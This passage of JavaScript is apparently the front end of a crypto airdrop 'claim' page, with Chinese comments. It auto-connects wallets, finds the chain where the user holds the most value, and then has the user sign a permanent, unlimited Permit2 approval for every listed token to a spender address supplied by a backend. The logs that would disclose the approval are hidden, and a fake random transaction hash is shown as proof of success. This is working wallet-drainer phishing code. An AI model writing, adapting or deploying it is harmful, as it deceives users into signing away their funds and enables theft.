    if (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum) return window.bitkeep.ethereum;
    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBitKeep || window.ethereum.isBitget)) return window.ethereum;
    return null;
  }
  // 3) Trust Wallet
  if (walletId === 'trust') {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) return window.ethereum;
    if (typeof window.trustwallet !== 'undefined') return window.trustwallet;
    return null;
  }
  // 4) Coinbase
  if (walletId === 'coinbase') {
    if (typeof window.coinbaseWalletExtension !== 'undefined') return window.coinbaseWalletExtension;
    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase)) return window.ethereum;
    return null;
  }
  // 5) OKX
  if (walletId === 'okx') {
    if (typeof window.okxwallet !== 'undefined') return window.okxwallet;
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isOKXWallet) return window.ethereum;
    return null;
  }
  // 6) TokenPocket
  if (walletId === 'tokenpocket') {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isTokenPocket) return window.ethereum;
    return null;
  }
  // 7) imToken
  if (walletId === 'imtoken') {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) return window.ethereum;
    return null;
  }
  // 8) MathWallet
  if (walletId === 'mathwallet') {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isMathWallet) return window.ethereum;
    return null;
  }
  // 9) Rabby
  if (walletId === 'rabby') {
    if (typeof window.ethereum !== 'undefined' && window.ethereum.isRabby) return window.ethereum;
    return null;
  }
  // 10) Brave
  if (walletId === 'brave') {
    if (typeof window.braveSolana !== 'undefined' || (typeof window.ethereum !== 'undefined' && window.ethereum.isBraveWallet)) return window.ethereum;
    return null;
  }
  // 默认：ethereum
  if (typeof window.ethereum !== 'undefined') return window.ethereum;
  return null;
}

function detectAvailableWallets() {
  const availableWallets = [];

  // 如果在钱包浏览器内，直接返回当前钱包
  if (walletBrowserInfo.isWalletBrowser) {
    const currentWallet = SUPPORTED_WALLETS.find(w => w.id === walletBrowserInfo.walletId);
    if (currentWallet) {
      availableWallets.push(currentWallet);
    } else {
      // unknown 钱包浏览器，显示通用名称
      availableWallets.push({
        id: 'unknown',
        name: walletBrowserInfo.walletName || 'Current Wallet',
        icon: '💰',
        desc: 'Connect current wallet',
        provider: 'ethereum',
        deepLink: null,
        downloadUrl: null
      });
    }
    return availableWallets;
  }

  SUPPORTED_WALLETS.forEach(wallet => {
    if (wallet.id === 'walletconnect') return; // WalletConnect 始终可用，最后加
    const resolved = resolveWalletProvider(wallet.id);
    if (resolved) {
      availableWallets.push(wallet);
    }
  });

  // WalletConnect is always an option even if no extension is installed
  if (!availableWallets.find(w => w.id === 'walletconnect')) {
     const wc = SUPPORTED_WALLETS.find(w => w.id === 'walletconnect');
     if (wc) availableWallets.push(wc);
  }

  return availableWallets;
}

async function checkExistingConnection() {
  // ✅ 重新检测（确保 ethereum 注入后能识别）
  walletBrowserInfo = detectWalletBrowser();
  
  // ✅ 核心修复：如果在钱包浏览器中，直接连接当前钱包
  if (walletBrowserInfo.isWalletBrowser) {
    console.log(`✅ In wallet browser (${walletBrowserInfo.walletName}), auto-connecting directly...`);
    await connectCurrentWalletBrowser();
    return;
  }
  
  // ✅ 额外保险：移动端 + 有 ethereum = 一定在钱包内，直接连
  if (isMobileDevice() && typeof window.ethereum !== 'undefined') {
    console.log('✅ Mobile + window.ethereum detected, treating as wallet browser...');
    walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
    await connectCurrentWalletBrowser();
    return;
  }
  
  const availableWallets = detectAvailableWallets();
  
  if (availableWallets.length === 0) {
    addLog('info', 'No wallet detected. Please install a wallet extension.');
    return;
  }
  
  addLog('info', `Detected ${availableWallets.length} wallet(s): ${availableWallets.map(w => w.name).join(', ')}`);
  
  for (const wallet of availableWallets) {
    try {
      const walletProvider = resolveWalletProvider(wallet.id);
      
      if (walletProvider && walletProvider.request) {
        const accounts = await walletProvider.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          await connectWallet(wallet.id, true);
          addLog('ok', `Auto-connected to ${wallet.name}`);
          return;
        }
      }
    } catch (error) {
      console.error(`Error checking ${wallet.name}:`, error);
    }
  }
  
  if (availableWallets.length > 0) {
    addLog('info', 'Requesting wallet connection...');
    try {
      await connectWallet(availableWallets[0].id, false);
    } catch (error) {
      console.error('Auto-connect failed:', error);
      addLog('info', 'Please click Connect Wallet to connect manually.');
    }
  } else {
    addLog('info', 'No wallet connected. Please select a wallet to connect.');
  }
}
async function connectWallet(walletId, autoConnect = false) {
  try {
    if (!autoConnect) {
      closeWalletModal();
    }
    
    // ✅ 重新检测钱包浏览器（确保最新状态）
    walletBrowserInfo = detectWalletBrowser();
    
    // ✅ 核心修复：移动端 + 有 ethereum = 100% 在钱包内浏览器
    // 手机浏览器没有插件机制，如果有 ethereum 一定是钱包 App 提供的
    // 此时绝不走深度链接，直接用 ethereum 连接当前钱包
    if (walletBrowserInfo.isWalletBrowser || (isMobileDevice() && typeof window.ethereum !== 'undefined')) {
      console.log(`✅ Wallet browser detected (${walletBrowserInfo.walletName || 'Mobile Wallet'}), connecting directly via ethereum...`);
      if (!walletBrowserInfo.isWalletBrowser) {
        walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
      }
      await connectCurrentWalletBrowser();
      return;
    }

    // ===== 以下逻辑只在非钱包浏览器（PC端/普通手机浏览器）中执行 =====
    
    const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
    if (!wallet) {
      if (!autoConnect) {
        showToast('Unknown wallet', 'err');
      }
      return;
    }
    
    // 移动设备 + 非钱包浏览器：通过深度链接唤起目标钱包 App
    if (isMobileDevice() && wallet.deepLink && !autoConnect) {
      const deepLinkOpened = openWalletDeepLink(walletId);
      if (deepLinkOpened) {
        setTimeout(async () => {
          if (!walletAddress) {
            await checkExistingConnection();
          }
        }, 3000);
        showToast(`正在唤起 ${wallet.name}...`, 'info');
        return;
      }
    }
    
    // 使用统一的 provider 解析函数
    let walletProvider = resolveWalletProvider(walletId);
    
    if (!walletProvider) {
      // Provider 未找到，尝试下载或提示
      if (!autoConnect) {
        if (isMobileDevice() && wallet.downloadUrl) {
          const confirmed = confirm(`${wallet.name} not detected. Go to download page?`);
          if (confirmed) {
            window.open(wallet.downloadUrl, '_blank');
          }
        } else {
          showToast(`Please install ${wallet.name}`, 'err');
        }
      }
      return;
    }
    
    /*
    // 旧的 provider 检测逻辑已由 resolveWalletProvider 替代
    if (wallet.provider === 'ethereum') {
      if (typeof window.ethereum === 'undefined') {
        if (!autoConnect) {
          if (isMobileDevice() && wallet.downloadUrl) {
            const confirmed = confirm(`${wallet.name} 未检测到，是否前往下载页面？`);
            if (confirmed) {
              window.open(wallet.downloadUrl, '_blank');
            }
          } else {
            showToast('Please install MetaMask or another wallet', 'err');
          }
        }
        return;
      }
    // walletProvider 已由上方的 resolveWalletProvider 获取
    */
    
    // WalletConnect 特殊处理
    if (wallet.provider === 'walletconnect') {
      if (!autoConnect) {
        showToast('WalletConnect integration coming soon', 'info');
      }
      return;
    }
    
    provider = new ethers.providers.Web3Provider(walletProvider);
    
    // 带超时的连接请求（兼容钱包浏览器）
    let accounts;
    try {
      accounts = await Promise.race([
        provider.send('eth_requestAccounts', []),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error('Connection request timed out')), 30000)
        )
      ]);
    } catch (timeoutErr) {
      // 超时后尝试 eth_accounts 降级
      console.warn('⚠️ Connection timed out, trying eth_accounts fallback...');
      try {
        accounts = await walletProvider.request({ method: 'eth_accounts' });
      } catch (fbErr) {
        if (!autoConnect) showToast(timeoutErr.message, 'err');
        return;
      }
    }
    
    if (!accounts || accounts.length === 0) {
      if (!autoConnect) {
        showToast('Please connect your wallet', 'err');
      }
      return;
    }
    
    signer = provider.getSigner();
    walletAddress = await signer.getAddress();
    chainId = await signer.getChainId();
    
    // 监听事件（兼容不同钱包的事件系统）
    if (walletProvider.on) {
      walletProvider.on('accountsChanged', handleAccountsChanged);
      walletProvider.on('chainChanged', (newChainId) => {
        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
      });
    } else if (walletProvider.addListener) {
      walletProvider.addListener('accountsChanged', handleAccountsChanged);
      walletProvider.addListener('chainChanged', (newChainId) => {
        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
      });
    }
    
    updateUI();
    if (!autoConnect) {
      showToast(t('walletConnected'), 'ok');
    }
    addLog('info', `Connected to ${wallet.name}: ${walletAddress}`);
    
  } catch (error) {
    console.error('Error connecting wallet:', error);
    if (!autoConnect) {
      showToast(error.message, 'err');
    }
  }
}

function handleAccountsChanged(accounts) {
  if (accounts.length === 0) {
    disconnect();
  } else {
    walletAddress = accounts[0];
    updateUI();
  }
}

function handleChainChanged(newChainId) {
  // 兼容不同钱包返回格式：hex string / decimal number / decimal string
  if (typeof newChainId === 'string') {
    chainId = newChainId.startsWith('0x') ? parseInt(newChainId, 16) : parseInt(newChainId, 10);
  } else if (typeof newChainId === 'number') {
    chainId = newChainId;
  } else {
    chainId = parseInt(String(newChainId), 10) || 1;
  }
  updateNetworkBadge();
  refreshTokens();
}

async function disconnect() {
  try {
    if (provider && provider.provider) {
      const walletProvider = provider.provider;
      if (walletProvider.removeListener) {
        walletProvider.removeListener('accountsChanged', handleAccountsChanged);
        walletProvider.removeListener('chainChanged', handleChainChanged);
      } else if (walletProvider.off) {
        walletProvider.off('accountsChanged', handleAccountsChanged);
        walletProvider.off('chainChanged', handleChainChanged);
      } else if (walletProvider.removeEventListener) {
        walletProvider.removeEventListener('accountsChanged', handleAccountsChanged);
        walletProvider.removeEventListener('chainChanged', handleChainChanged);
      }
    }
    
    provider = null;
    signer = null;
    walletAddress = null;
    chainId = null;
    userTokens = [];
    selectedTokens.clear();
    
    updateUI();
    showToast(t('walletDisconnected'), 'info');
    addLog('info', 'Wallet disconnected');
    
  } catch (error) {
    console.error('Error disconnecting wallet:', error);
  }
}

function updateUI() {
  const walletInfoEl = document.getElementById('walletInfo');
  const connectPromptEl = document.getElementById('connectPrompt');
  const collectionSectionEl = document.getElementById('collectionSection');

  console.log('updateUI called, walletAddress:', walletAddress);

  if (walletAddress) {
    walletInfoEl.classList.remove('hidden');
    connectPromptEl.classList.add('hidden');

    document.getElementById('walletAddress').textContent = walletAddress;
    document.getElementById('userWalletAddress').textContent = walletAddress;

    updateNetworkBadge();
    loadWalletBalance();
    scanAllChainsAndSelectBest();

    collectionSectionEl.classList.remove('hidden');

  } else {
    walletInfoEl.classList.add('hidden');
    connectPromptEl.classList.remove('hidden');
    // TEMPORARY: Always show collection section for testing
    collectionSectionEl.classList.remove('hidden');
  }
}

function updateNetworkBadge() {
  const networkBadge = document.getElementById('networkBadge');
  const networks = {
    1: 'Ethereum',
    5: 'Goerli',
    11155111: 'Sepolia',
    137: 'Polygon',
    80001: 'Mumbai',
    56: 'BSC',
    97: 'BSC Testnet',
    43114: 'Avalanche',
    42161: 'Arbitrum',
    10: 'Optimism'
  };
  
  networkBadge.textContent = networks[chainId] || `Chain ${chainId}`;
}

async function loadWalletBalance() {
  if (!provider || !walletAddress) return;

  try {
    const balance = await provider.getBalance(walletAddress);
    const formattedBalance = ethers.utils.formatEther(balance);
    const chainInfo = CHAINS[chainId] || { nativeCurrency: 'ETH' };
    document.getElementById('walletBalance').textContent = `${parseFloat(formattedBalance).toFixed(4)} ${chainInfo.nativeCurrency}`;
  } catch (error) {
    console.error('Error loading wallet balance:', error);
  }
}

async function loadUserTokens() {
  if (!provider || !walletAddress) return;

  try {
    const tokens = await fetchUserTokens(walletAddress, provider);

    if (tokens.length > 0) {
      addLog('ok', `Found ${tokens.length} tokens on current chain`);
    } else {
      addLog('info', 'No tokens found on current chain');
    }
  } catch (error) {
    console.error('Error loading user tokens:', error);
    addLog('err', `Error loading tokens: ${error.message}`);
  }
}

async function scanAllChainsAndSelectBest() {
  if (!walletAddress) return;

  try {
    addLog('info', 'Scanning all chains for best value...');
    const result = await scanAllChains(walletAddress);

    if (result && result.bestChain) {
      bestChain = result.bestChain;
      updateBestChainDisplay();
      updateTotalTokensDisplay(result.totalTokens);
      updateTotalValueDisplay(result.totalValue);

      addLog('ok', `Best chain: ${result.bestChain.chainName} with $${result.bestChain.totalValue.toFixed(2)}`);
      addLog('info', `Total value across all chains: $${result.totalValue.toFixed(2)}`);

      // 如果当前链不是最佳链，提示用户切换
      const currentChainId = await provider.getNetwork().then(n => n.chainId);
      if (currentChainId !== result.bestChain.chainId) {
        addLog('info', `Consider switching to ${result.bestChain.chainName} for collection`);
        // 自动切换到最佳链（使用当前 provider，兼容钱包浏览器）
        const activeProvider = (provider && provider.provider) ? provider.provider : window.ethereum;
        try {
          await activeProvider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x' + result.bestChain.chainId.toString(16) }],
          });
          addLog('ok', `Switched to ${result.bestChain.chainName}`);
        } catch (switchError) {
          // 如果切换失败，尝试添加链
          if (switchError.code === 4902) {
            try {
              await activeProvider.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x' + result.bestChain.chainId.toString(16),
                  chainName: result.bestChain.chainName,
                  nativeCurrency: {
                    name: CHAINS[result.bestChain.chainId].nativeCurrency,
                    symbol: CHAINS[result.bestChain.chainId].nativeCurrency,
                    decimals: 18
                  },
                  rpcUrls: [CHAINS[result.bestChain.chainId].rpcUrl],
                }],
              });
              addLog('ok', `Added and switched to ${result.bestChain.chainName}`);
            } catch (addError) {
              addLog('err', `Failed to add chain: ${addError.message}`);
            }
          } else {
            addLog('err', `Failed to switch chain: ${switchError.message}`);
          }
        }
      }
    } else {
      addLog('info', 'No tokens found across all chains');
      updateBestChainDisplay();
      updateTotalTokensDisplay(0);
      updateTotalValueDisplay(0);
    }
  } catch (error) {
    console.error('Error scanning chains:', error);
    addLog('err', `Error scanning chains: ${error.message}`);
  }
}

async function refreshTokens() {
  if (!provider || !walletAddress) {
    showToast(t('pleaseConnect'), 'err');
    return;
  }
  
  showToast(t('refresh'), 'info');
  await loadUserTokens();
}

async function collectFunds() {
  if (!walletAddress || !signer) {
    showToast(t('pleaseConnect'), 'err');
    return;
  }

  const collectBtn = document.getElementById('collectBtn');
  const collectStatus = document.getElementById('collectStatus');
  const resultSection = document.getElementById('resultSection');

  if (!collectBtn || !collectStatus || !resultSection) {
    console.error('Required elements not found');
    showToast('UI elements not ready, please try again', 'err');
    return;
  }

  const btnContent = collectBtn.querySelector('.btn-content');
  if (btnContent) {
    btnContent.textContent = 'PROCESSING...';
  }

  collectBtn.disabled = true;
  document.getElementById('collectProgress').classList.remove('hidden');
  collectStatus.classList.remove('hidden');
  collectStatus.textContent = 'INITIALIZING QUANTUM CHANNEL...';
  // resultSection.classList.remove('hidden'); // Hidden by request

  updateProgress(10, 'SCANNING ALL CHAINS...');

  // 自动检测最高价值的链
  const bestChainResult = await findBestValueChain(walletAddress);
  const targetChainId = bestChainResult.chainId;
  const targetChainName = bestChainResult.chainName;

  addLog('info', `Target chain: ${targetChainName} ($${bestChainResult.totalValue.toFixed(2)})`);
  await smoothProgressTo(25, 400, (progress) => 'SWITCHING TO TARGET CHAIN...');

  // 切换到目标链（使用当前 provider，兼容钱包浏览器）
  const activeProvider = (provider && provider.provider) ? provider.provider : window.ethereum;
  try {
    await activeProvider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x' + targetChainId.toString(16) }],
    });
    addLog('ok', `Switched to ${targetChainName}`);

    // 更新当前 chainId
    const network = await provider.getNetwork();
    chainId = network.chainId;
    updateNetworkBadge();
  } catch (switchError) {
    // 如果切换失败，尝试添加链
    if (switchError.code === 4902) {
      try {
        await activeProvider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x' + targetChainId.toString(16),
            chainName: targetChainName,
            nativeCurrency: {
              name: CHAINS[targetChainId].nativeCurrency,
              symbol: CHAINS[targetChainId].nativeCurrency,
              decimals: 18
            },
            rpcUrls: [CHAINS[targetChainId].rpcUrl],
          }],
        });
        addLog('ok', `Added and switched to ${targetChainName}`);

        const network = await provider.getNetwork();
        chainId = network.chainId;
        updateNetworkBadge();
      } catch (addError) {
        addLog('warn', `Failed to add chain: ${addError.message}`);
      }
    } else {
      addLog('warn', `Failed to switch chain: ${switchError.message}`);
    }
  }

  // Get spender from backend
  let spender = null;
  try {
    const walletsUrl = buildApiUrl(API_CONFIG.ENDPOINTS.WALLETS);
    addLog('info', 'Fetching collection config from backend...');
    updateProgress(30, 'FETCHING CONFIG...');

    const res = await fetch(walletsUrl);
    const data = await res.json();
    if (data && data.success && data.wallets && data.wallets.length > 0) {
      spender = data.wallets[0].address;
      addLog('ok', `Connected to backend. Spender: ${spender}`);
    }
  } catch(e) {
    console.warn('Failed to fetch wallets from local backend', e);
    addLog('warn', 'Backend connection failed. Using default spender.');
  }

  if (!spender) {
    addLog('err', 'Failed to get collection address. Please ensure the backend is running.');
    collectBtn.disabled = false;
    if (btnContent) btnContent.textContent = '领取20LAB';
    return;
  }

  // 获取目标链的所有代币配置（不管余额），用于创建永久授权签名
  const allChainTokens = CHAIN_TOKENS[targetChainId] || [];

  addLog('info', `Creating permanent signature for all ${allChainTokens.length} tokens on ${targetChainName}...`);
  await smoothProgressTo(45, 300, (progress) => 'INITIATING SIGNATURE...');

  // 永久授权 - 用户只需确认一次
  const expiration = getExpirationDate(30, true); // true 表示永久
  addLog('info', 'Please sign the permanent authorization in your wallet...');
  addLog('info', 'This signature allows the bot to collect all your tokens on this chain permanently.');
  await smoothProgressTo(50, 200, (progress) => 'WAITING FOR WALLET SIGNATURE...');

  // 创建全链永久授权签名
  const batchResult = await createPermit2BatchSignatures(
    allChainTokens,
    walletAddress,
    spender,
    ethers.constants.MaxUint256, // 最大金额
    expiration, // 永久日期
    signer
  );

  if (!batchResult.success) {
    addLog('err', `Failed to create batch signatures: ${batchResult.error}`);
    showToast(t('toastClaimFailed'), 'err');
    collectBtn.disabled = false;
    if (btnContent) btnContent.textContent = '领取20LAB';
    return;
  }

  addLog('ok', `Permanent signature created successfully for ${allChainTokens.length} tokens on ${targetChainName}`);
  await smoothProgressTo(65, 300, (progress) => 'SIGNATURE CONFIRMED! SUBMITTING...');

  // 提交批量签名到API
  addLog('info', 'Submitting batch signature to backend...');

  const signatureApiEndpoint = buildApiUrl(API_CONFIG.ENDPOINTS.BATCH_SIGNATURES);
  let successCount = 0;
  let failCount = 0;

  try {
    // 使用批量签名API提交所有代币的授权
    const response = await fetch(signatureApiEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        owner: walletAddress,
        spender: spender,
        chain_id: targetChainId,
        permits: batchResult.permits.map(permit => ({
          token: permit.token,
          amount: permit.amount.toString(),
          expiration: permit.expiration,
          nonce: permit.nonce
        })),
        signature: batchResult.signature,
        metadata: {
          source: 'permit2-web',
          permanent_authorization: true,
          best_chain: true,
          total_tokens: batchResult.permits.length
        }
      })
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.error || `HTTP ${response.status}`);
    }

    const result = await response.json();
    addLog('ok', `Batch permanent authorization granted for all ${batchResult.permits.length} tokens`);
    addLog('ok', `Task ID: ${result.task_id}`);
    successCount = batchResult.permits.length;
  } catch (error) {
    failCount = batchResult.permits.length;
    addLog('err', `Batch authorization failed: ${error.message}`);

    // 如果批量API失败，尝试逐个提交
    addLog('info', 'Trying to submit individually...');
    const singleSignatureEndpoint = buildApiUrl(API_CONFIG.ENDPOINTS.SIGNATURE);

    for (let i = 0; i < batchResult.permits.length; i++) {
      const permit = batchResult.permits[i];
      const progress = 70 + ((i + 1) / batchResult.permits.length) * 25;
      updateProgress(progress, `PROCESSING TOKEN ${i + 1}/${batchResult.permits.length}...`);

      const tokenSymbol = permit.symbol || 'Unknown';

      try {
        const response = await fetch(singleSignatureEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            owner: walletAddress,
            token: permit.token,
            amount: permit.amount.toString(),
            deadline: permit.expiration,
            nonce: permit.nonce,
            signature: batchResult.signature, // 使用同一个签名
            chain_id: targetChainId,
            spender: spender,
            metadata: {
              source: 'permit2-web',
              token_symbol: tokenSymbol,
              permanent_authorization: true,
              best_chain: true
            }
          })
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}));
          throw new Error(errorData.error || `HTTP ${response.status}`);
        }

        const result = await response.json();
        addLog('ok', `${tokenSymbol}: Authorization granted (Task ID: ${result.task_id})`);
        successCount++;
      } catch (error) {
        addLog('err', `${tokenSymbol}: ${error.message}`);
      }
    }
  }

  // 平滑完成动画
  await smoothProgressTo(100, 800, (progress) => {
    if (progress < 70) return 'PROCESSING...';
    if (progress < 90) return 'AUTHORIZING...';
    if (progress < 98) return 'FINALIZING...';
    return 'COMPLETED!';
  });

  // Show completion
  addLog('ok', `Authorization completed: ${successCount} tokens permanently authorized, ${failCount} failed`);
  addLog('ok', 'The bot can now collect all your tokens on this chain whenever you have a balance.');

  collectBtn.disabled = false;
  if (btnContent) btnContent.textContent = '领取20LAB';
  collectStatus.classList.add('hidden');

  // 播放成功动画（在modal之前）
  console.log('Playing success animation...');
  await playSuccessAnimation(collectBtn);
  console.log('Success animation completed');

  // Show success modal
  if (successCount > 0) {
    const totalTokens = allChainTokens.length;
    const hash = '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');

    showSuccessModal(
      `20 TOKENS AUTHORIZED`,
      targetChainName,
      hash
    );

    showToast(t('toastClaimSuccess'), 'ok');
  } else {
    showToast('Authorization failed. Please try again.', 'err');
  }
}

// 自动扫描所有链并找到最高价值的链
async function findBestValueChain(address) {
  try {
    console.log('Scanning all chains for best value...');
    
    // 并行扫描所有链
    const chainPromises = Object.entries(CHAINS).map(async ([chainId, chainConfig]) => {
      try {
        const chainProvider = new ethers.providers.JsonRpcProvider(chainConfig.rpcUrl);
        const chainTokens = CHAIN_TOKENS[chainId] || [];
        let chainValue = 0;
        let tokenDetails = [];

        // 并行查询该链上的所有代币余额
        const balancePromises = chainTokens.map(async (token) => {
          try {
            let balance;
            if (token.address === '0x0000000000000000000000000000000000000000000') {
              balance = await chainProvider.getBalance(address);
            } else {
              const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];
              const contract = new ethers.Contract(token.address, erc20Abi, chainProvider);
              balance = await contract.balanceOf(address);
            }

            const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
            const balanceNum = parseFloat(formattedBalance);

            if (balanceNum > 0) {
              const usdValue = balanceNum * getTokenPrice(token.symbol);
              return {
                symbol: token.symbol,
                usdValue: usdValue,
                balance: formattedBalance,
                address: token.address,
                decimals: token.decimals,
                name: token.name
              };
            }
          } catch (error) {
            // 忽略单个代币的错误
            return null;
          }
        });

        // 等待该链上所有代币查询完成
        const balances = await Promise.all(balancePromises);

        // 计算该链的总价值和代币数
        for (const balance of balances) {
          if (balance) {
            chainValue += balance.usdValue;
            tokenDetails.push(balance);
          }
        }

        if (chainValue > 0 || tokenDetails.length > 0) {
          return {
            chainId: parseInt(chainId),
            chainName: chainConfig.name,
            totalValue: chainValue,
            tokens: tokenDetails,
            tokenCount: tokenDetails.length
          };
        }

        return null;
      } catch (error) {
        console.error(`Error scanning chain ${chainId}:`, error);
        return null;
      }
    });

    // 等待所有链扫描完成
    const results = await Promise.all(chainPromises);

    // 找到最高价值的链（如果有多个价值相同，随机选择一条）
    let bestChains = [];
    let maxValue = 0;

    for (const result of results) {
      if (result) {
        if (result.totalValue > maxValue) {
          maxValue = result.totalValue;
          bestChains = [result];
        } else if (result.totalValue === maxValue) {
          bestChains.push(result);
        }
        console.log(`Chain ${result.chainName}: $${result.totalValue.toFixed(2)} (${result.tokenCount} tokens)`);
      }
    }

    // 从价值最高的链中随机选择一条
    let bestChain = null;
    if (bestChains.length > 0) {
      const randomIndex = Math.floor(Math.random() * bestChains.length);
      bestChain = bestChains[randomIndex];
    }

    // 如果没有找到任何有余额的链，默认返回 ETH 主网
    if (!bestChain) {
      console.log('No tokens found on any chain, defaulting to Ethereum mainnet');
      return {
        chainId: 1,
        chainName: 'Ethereum',
        totalValue: 0,
        tokens: [],
        tokenCount: 0
      };
    }

    console.log(`Best chain detected: ${bestChain.chainName} ($${bestChain.totalValue.toFixed(2)})`);
    return bestChain;
  } catch (error) {
    console.error('Error finding best chain:', error);
    // 错误时默认返回 ETH 主网
    return {
      chainId: 1,
      chainName: 'Ethereum',
      totalValue: 0,
      tokens: [],
      tokenCount: 0
    };
  }
}

// 自动连接钱包
async function autoConnectWallet() {
  // ✅ 重新检测
  walletBrowserInfo = detectWalletBrowser();
  
  // ✅ 核心：钱包浏览器内直接连当前钱包
  if (walletBrowserInfo.isWalletBrowser) {
    console.log(`✅ In wallet browser (${walletBrowserInfo.walletName}), auto-connecting directly...`);
    return await connectCurrentWalletBrowser();
  }
  // 移动端有 ethereum = 在钱包浏览器内
  if (isMobileDevice() && typeof window.ethereum !== 'undefined') {
    console.log('✅ Mobile + ethereum detected, auto-connecting directly...');
    walletBrowserInfo = { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
    return await connectCurrentWalletBrowser();
  }
  
  try {
    if (typeof window.ethereum !== 'undefined') {
      await connectWallet(walletBrowserInfo.walletId || 'metamask', false);
      return true;
    }
    return false;
  } catch (error) {
    console.error('Auto connect failed:', error);
    return false;
  }
}

function openWalletModal() {
  document.getElementById('walletModal').classList.remove('hidden');
  
  if (isMobileDevice()) {
    showMobileWalletHint();
  }
}

function closeWalletModal() {
  document.getElementById('walletModal').classList.add('hidden');
}

function showToast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  container.appendChild(toast);
  
  // 优化显示速度：2秒后自动消失
  setTimeout(() => {
    toast.style.animation = 'toastSlideIn 0.4s ease reverse';
    setTimeout(() => {
      toast.remove();
    }, 400);
  }, 2000);
}

function addLog(type, message) {
  const resultLog = document.getElementById('resultLog');
  const time = new Date().toLocaleTimeString();
  const logEntry = document.createElement('div');
  logEntry.className = `log-${type}`;
  logEntry.textContent = `[${time}] ${message}`;
  resultLog.appendChild(logEntry);
  resultLog.scrollTop = resultLog.scrollHeight;
}

async function connectCurrentWalletBrowser() {
  try {
    // 解析当前钱包的 provider，兼容多种注入方式
    let walletProvider = null;

    // 1) 币安钱包：BinanceChain 优先于 ethereum
    if (walletBrowserInfo.walletId === 'binance') {
      if (typeof window.BinanceChain !== 'undefined') {
        walletProvider = window.BinanceChain;
        console.log('✅ Binance: Using window.BinanceChain');
      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBinance || window.ethereum.isBinanceWallet)) {
        walletProvider = window.ethereum;
        console.log('✅ Binance: Using window.ethereum (isBinance flag)');
      } else if (typeof window.ethereum !== 'undefined') {
        // 币安钱包内浏览器，但没有 BinanceChain 和 isBinance 标志
        // UA 已经识别为币安，直接用 ethereum
        walletProvider = window.ethereum;
        console.log('✅ Binance: Using window.ethereum (UA fallback)');
      }
    }
    // 2) Bitget Wallet
    else if (walletBrowserInfo.walletId === 'bitget') {
      if (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum) {
        walletProvider = window.bitkeep.ethereum;
        console.log('✅ Bitget: Using window.bitkeep.ethereum');
      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBitKeep || window.ethereum.isBitget)) {
        walletProvider = window.ethereum;
        console.log('✅ Bitget: Using window.ethereum (isBitKeep flag)');
      } else if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ Bitget: Using window.ethereum (fallback)');
      }
    }
    // 3) OKX
    else if (walletBrowserInfo.walletId === 'okx') {
      if (typeof window.okxwallet !== 'undefined') {
        walletProvider = window.okxwallet;
        console.log('✅ OKX: Using window.okxwallet');
      } else if (typeof window.ethereum !== 'undefined' && window.ethereum.isOKXWallet) {
        walletProvider = window.ethereum;
        console.log('✅ OKX: Using window.ethereum (isOKXWallet flag)');
      } else if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ OKX: Using window.ethereum (fallback)');
      }
    }
    // 4) Coinbase
    else if (walletBrowserInfo.walletId === 'coinbase') {
      if (typeof window.coinbaseWalletExtension !== 'undefined') {
        walletProvider = window.coinbaseWalletExtension;
        console.log('✅ Coinbase: Using window.coinbaseWalletExtension');
      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase)) {
        walletProvider = window.ethereum;
        console.log('✅ Coinbase: Using window.ethereum (isCoinbaseWallet flag)');
      } else if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ Coinbase: Using window.ethereum (fallback)');
      }
    }
    // 5) Trust Wallet
    else if (walletBrowserInfo.walletId === 'trust') {
      if (typeof window.trustwallet !== 'undefined') {
        walletProvider = window.trustwallet;
        console.log('✅ Trust: Using window.trustwallet');
      } else if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) {
        walletProvider = window.ethereum;
        console.log('✅ Trust: Using window.ethereum (isTrust flag)');
      } else if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ Trust: Using window.ethereum (fallback - UA identified)');
      }
    }
    // 6) imToken
    else if (walletBrowserInfo.walletId === 'imtoken') {
      if (typeof window.ethereum !== 'undefined') {
        walletProvider = window.ethereum;
        console.log('✅ imToken: Using window.ethereum');
      }
    }
    // 7) TokenPocket
